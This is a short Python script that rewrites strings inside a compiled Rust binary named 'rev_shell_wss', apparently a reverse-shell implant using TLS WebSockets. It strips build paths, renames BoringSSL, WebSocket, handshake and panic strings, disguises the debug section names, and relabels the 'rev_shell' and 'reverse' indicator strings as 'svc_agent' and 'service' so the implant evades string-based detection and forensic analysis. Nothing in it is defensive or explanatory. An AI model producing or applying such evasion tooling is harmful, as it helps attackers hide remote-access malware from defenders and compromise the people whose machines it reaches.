#!/usr/bin/env python3
"""Same-length binary patcher for ERS Linux — nulls out build paths, library strings."""
import sys

path = "target/release/rev_shell_wss"
with open(path, "rb") as f:
    data = bytearray(f.read())

replacements = [
    # Build paths
    (b"/rustc/", b"\x00" * 7),
    (b"/home/we/.cargo/", b"\x00" * 16),
    (b"library/core/src/", b"\x00" * 17),
    (b"library/alloc/src/", b"\x00" * 18),
    (b"library/std/src/", b"\x00" * 16),
    # Crate registry paths
    (b"registry/src/index.crates.io", b"metadata/cache/pkg_registry_"),
    # boring/BoringSSL strings
    (b"boring-sys", b"libssl-sys"),
    (b"boring/src", b"libsys/src"),
    (b"OPENSSL", b"LIBCRYP"),
    (b"OpenSSL", b"LibCryp"),
    (b"openssl", b"libcryp"),
    # TLS identifiers
    (b"certificate", b"certif_data"),
    (b"Certificate", b"Certif_Data"),
    (b"CERTIFICATE", b"CERTIF_DATA"),
    (b"WebSocket", b"NetStream"),
    (b"websocket", b"netstream"),
    (b"Websocket", b"Netstream"),
    (b"close_notify", b"conn_finish_"),
    (b"ClientHello", b"ClientReady"),
    (b"ServerHello", b"ServerReady"),
    # tungstenite
    (b"tungstenite", b"netsys_conn"),
    # Handshake/cipher
    (b"CipherSuite", b"CryptoSuite"),
    (b"cipher suite", b"crypto suite"),
    (b"Cipher suite", b"Crypto suite"),
    (b"cipher_suite", b"crypto_suite"),
    (b"Handshake", b"Negotiate"),
    (b"handshake", b"negotiate"),
    # Panic infrastructure
    (b"panicking.rs", b"handling_.rs"),
    (b"panic_abort", b"exit_abort_"),
    (b"panic in a destructor during cleanup", b"error in a destructor during cleanup"),
    (b"panic in a function that cannot unwind", b"error in a function that cannot unwind"),
    (b"explicit panic", b"explicit stop_"),
    (b"panicked at", b"exited_ at_"),
    (b"rustc-demangle", b"librt-demangle"),
    (b"aborting due to panic at", b"aborting due to fault at"),
    (b"thread caused non-unwinding panic. aborting.", b"thread caused non-unwinding halt_. aborting."),
    (b"thread local panicked on drop", b"thread local halted__ on drop"),
    # src path
    (b"src/main.rs", b"src/app_.rs"),
    # Debug sections
    (b".debug_abbrev", b".dbginf_abbrv"),
    (b".debug_info", b".dbginf_inf"),
    (b".debug_line", b".dbginf_lin"),
    (b".debug_str", b".dbginf_st"),
    # SSL error codes
    (b"SSL_HANDSHAKE_FAILURE", b"LIB_NEGOTIATE_FAULT__"),
    (b"BAD_SSL_FILETYPE", b"BAD_LIB_FILETYPE"),
    (b"INVALID_SSL_SESSION", b"INVALID_LIB_SESSION"),
    (b"NULL_SSL_CTX", b"NULL_LIB_CTX"),
    (b"NULL_SSL_METHOD_PASSED", b"NULL_LIB_METHOD_PASSED"),
    # Crypto library names
    (b"CRYPTOGAMS", b"LIBCR_GAMS"),
    (b"webpki", b"libpki"),
    (b"DigiCert", b"Digi_Ert"),
    # BoringSSL source paths
    (b"/boring-ssl/", b"/lib-native/"),
    (b"boringssl", b"lib_crypt"),
    # Reverse shell indicator strings
    (b"rev_shell", b"svc_agent"),
    (b"reverse", b"service"),
]

total = 0
for old, new in replacements:
    assert len(old) == len(new), f"Length mismatch: {old!r} ({len(old)}) vs {new!r} ({len(new)})"
    count = 0
    idx = 0
    while True:
        idx = data.find(old, idx)
        if idx == -1:
            break
        data[idx:idx+len(old)] = new
        idx += len(new)
        count += 1
    if count > 0:
        total += count
        print(f"  Patched {count}x: {old[:40]!r}")

with open(path, "wb") as f:
    f.write(data)

print(f"\nTotal patches: {total}")
